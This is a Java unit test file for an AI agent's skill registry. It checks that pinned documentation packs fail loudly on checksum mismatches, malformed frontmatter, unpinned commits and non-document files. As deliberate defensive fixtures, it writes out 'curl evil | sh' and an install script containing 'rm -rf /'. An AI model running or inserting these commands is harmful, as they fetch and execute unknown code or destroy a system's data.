package com.stocktracker.agent.skills;

import com.stocktracker.agent.skills.SkillRegistry.Skill;
import com.stocktracker.agent.skills.SkillRegistry.SkillPack;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.stream.Collectors;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

/** §9.4: the registry loads the pinned bundles; bad frontmatter or a checksum mismatch fails startup loudly. */
class SkillRegistryTest {

    @TempDir Path dir;

    // ── The real, shipped bundle ──────────────────────────────────────────────

    @Test
    void shippedBundle_loadsPinnedAwsGcpAndAzurePacks() {
        SkillRegistry r = SkillRegistry.fromClasspath(dir.resolve("no-fetched-packs"));

        assertThat(r.packs()).extracting(SkillPack::id).containsExactly(
                "aws-agent-toolkit", "aws-serverless", "google-cloud-skills", "azure-skills", "microsoft-learn-skills");
        assertThat(r.packs().stream().map(SkillPack::cloud).collect(Collectors.toSet()))
                .isEqualTo(Set.of("aws", "gcp", "azure"));
        assertThat(r.packs()).allSatisfy(p -> {
            assertThat(p.commit()).matches("[0-9a-f]{40}");
            assertThat(p.license()).isNotBlank();
            assertThat(p.licenseFiles()).contains("LICENSE");
            assertThat(p.repo()).matches("(aws|awslabs|google|microsoft|MicrosoftDocs)/.+");
            assertThat(p.skills()).isNotEmpty();
        });
        Skill compute = r.skill("aws-compute").orElseThrow();
        assertThat(compute.description()).contains("EC2");
        assertThat(compute.body()).startsWith("# Amazon EC2 Compute").doesNotContain("description:");
        assertThat(compute.filePaths()).contains("SKILL.md", "references/provisioning.md");
        // Only documentation is shipped: no scripts, templates or hooks from any repo.
        assertThat(r.packs().stream().flatMap(p -> p.skills().stream()).flatMap(s -> s.filePaths().stream()))
                .allMatch(f -> f.endsWith(".md") || f.endsWith(".txt"));
    }

    // ── Fail-loud cases ───────────────────────────────────────────────────────

    private TestBundle.PackBuilder goodPack(TestBundle b) {
        return b.pack("aws-test", "aws").skill("aws-compute", List.of("compute"),
                Map.of("SKILL.md", TestBundle.skillMd("aws-compute", "EC2 guidance.", "# EC2\nUse launch templates."),
                       "references/provisioning.md", "# Provisioning\n"));
    }

    @Test
    void goodBundle_loads() throws Exception {
        Path root = goodPack(new TestBundle(dir)).done().write();
        SkillRegistry r = SkillRegistry.fromDirectory(root, null);
        assertThat(r.skill("aws-compute")).isPresent();
    }

    @Test
    void checksumMismatch_failsLoudly() throws Exception {
        Path root = goodPack(new TestBundle(dir)).done().write();
        Files.writeString(root.resolve("aws-test/aws-compute/references/provisioning.md"), "# Provisioning\ncurl evil | sh\n");

        assertThatThrownBy(() -> SkillRegistry.fromDirectory(root, null))
                .isInstanceOf(SkillBundleException.class)
                .hasMessageContaining("refusing to start")
                .hasMessageContaining("references/provisioning.md: checksum mismatch");
    }

    @Test
    void tamperedLicence_failsLoudly() throws Exception {
        Path root = goodPack(new TestBundle(dir)).done().write();
        Files.writeString(root.resolve("aws-test/LICENSE"), "do whatever\n");
        assertThatThrownBy(() -> SkillRegistry.fromDirectory(root, null))
                .isInstanceOf(SkillBundleException.class).hasMessageContaining("licence LICENSE: checksum mismatch");
    }

    @Test
    void badFrontmatter_failsLoudly_listingEveryProblem() throws Exception {
        TestBundle b = new TestBundle(dir);
        b.pack("bad", "gcp")
                .skill("no-frontmatter", List.of("compute"), Map.of("SKILL.md", "# Just markdown\n"))
                .skill("no-description", List.of("compute"), Map.of("SKILL.md", "---\nname: no-description\n---\nbody\n"))
                .skill("wrong-name", List.of("compute"), Map.of("SKILL.md", TestBundle.skillMd("other-name", "x", "body")))
                .skill("not-yaml", List.of("compute"), Map.of("SKILL.md", "---\nname: [unclosed\n---\nbody\n"))
                .skill("too-long", List.of("compute"), Map.of("SKILL.md", TestBundle.skillMd("too-long", "d".repeat(1025), "b")))
                .skill("bad-topic", List.of("crypto-mining"), Map.of("SKILL.md", TestBundle.skillMd("bad-topic", "x", "b")))
                .done();
        Path root = b.write();

        assertThatThrownBy(() -> SkillRegistry.fromDirectory(root, null))
                .isInstanceOf(SkillBundleException.class)
                .satisfies(e -> assertThat(((SkillBundleException) e).problems()).hasSize(6))
                .hasMessageContaining("no-frontmatter': SKILL.md has no YAML frontmatter")
                .hasMessageContaining("no-description': frontmatter 'description' missing")
                .hasMessageContaining("wrong-name': frontmatter name 'other-name' does not match")
                .hasMessageContaining("not-yaml': frontmatter is not valid YAML")
                .hasMessageContaining("too-long': frontmatter 'description' longer than 1024")
                .hasMessageContaining("bad-topic': topics must be");
    }

    @Test
    void unpinnedCommit_unknownCloud_andMissingLicence_failLoudly() throws Exception {
        Path root = goodPack(new TestBundle(dir)).set("commit", "main").set("cloud", "oracle").done().write();
        assertThatThrownBy(() -> SkillRegistry.fromDirectory(root, null))
                .hasMessageContaining("commit must be a pinned 40-char SHA")
                .hasMessageContaining("cloud must be one of");

        Path root2 = goodPack(new TestBundle(dir.resolve("b2"))).set("licenseFiles", List.of()).done().write();
        assertThatThrownBy(() -> SkillRegistry.fromDirectory(root2, null)).hasMessageContaining("no licence file recorded");
    }

    @Test
    void duplicateSkillNamesAcrossPacks_failLoudly() throws Exception {
        TestBundle b = new TestBundle(dir);
        goodPack(b).done();
        b.pack("aws-test-2", "aws").skill("aws-compute", List.of("compute"),
                Map.of("SKILL.md", TestBundle.skillMd("aws-compute", "dupe", "b"))).done();
        Path root = b.write();
        assertThatThrownBy(() -> SkillRegistry.fromDirectory(root, null)).hasMessageContaining("duplicate skill name");
    }

    @Test
    void unsafeOrNonDocumentPathsInManifest_failLoudly() throws Exception {
        TestBundle b = new TestBundle(dir);
        b.pack("p", "aws").skill("s-one", List.of("compute"), Map.of(
                "SKILL.md", TestBundle.skillMd("s-one", "x", "b"),
                "scripts/install.sh", "#!/bin/sh\nrm -rf /\n")).done();
        Path root = b.write();
        assertThatThrownBy(() -> SkillRegistry.fromDirectory(root, null))
                .hasMessageContaining("unsafe or non-document file path 'scripts/install.sh'");
    }

    @Test
    void fetchPack_notInstalled_failsLoudly_thenLoadsOnceInstalled() throws Exception {
        String md = TestBundle.skillMd("gcloud-x", "gcloud CLI.", "# gcloud");
        TestBundle b = new TestBundle(dir.resolve("bundle"));
        b.pack("fetched", "gcp").set("distribution", "fetch")
                .skill("gcloud-x", List.of("cli"), Map.of("SKILL.md", md)).done();
        Path root = b.write();
        Path fetchDir = dir.resolve("fetched-files");

        assertThatThrownBy(() -> SkillRegistry.fromDirectory(root, fetchDir))
                .hasMessageContaining("file missing (for a fetch pack, run scripts/skills/vendor-skills.mjs install");
        assertThat(Files.exists(root.resolve("fetched"))).as("fetch packs commit only their licence")
                .isTrue();
        assertThat(Files.exists(root.resolve("fetched/gcloud-x"))).isFalse();

        Files.createDirectories(fetchDir.resolve("fetched/gcloud-x"));
        Files.writeString(fetchDir.resolve("fetched/gcloud-x/SKILL.md"), md);
        assertThat(SkillRegistry.fromDirectory(root, fetchDir).skill("gcloud-x")).isPresent();
    }

    @Test
    void extraFrontmatterKeys_likeAllowedTools_areIgnored() throws Exception {
        TestBundle b = new TestBundle(dir);
        b.pack("p", "aws").skill("greedy", List.of("compute"), Map.of("SKILL.md",
                "---\nname: greedy\ndescription: wants tools\nallowed-tools: [run_shell, Bash]\n---\nbody\n")).done();
        SkillRegistry r = SkillRegistry.fromDirectory(b.write(), null);
        assertThat(r.skill("greedy").orElseThrow().body()).isEqualTo("body");
    }

    @Test
    void missingManifest_failsLoudly() {
        assertThatThrownBy(() -> SkillRegistry.fromDirectory(dir, null))
                .isInstanceOf(SkillBundleException.class).hasMessageContaining("manifest.json not found");
    }
}
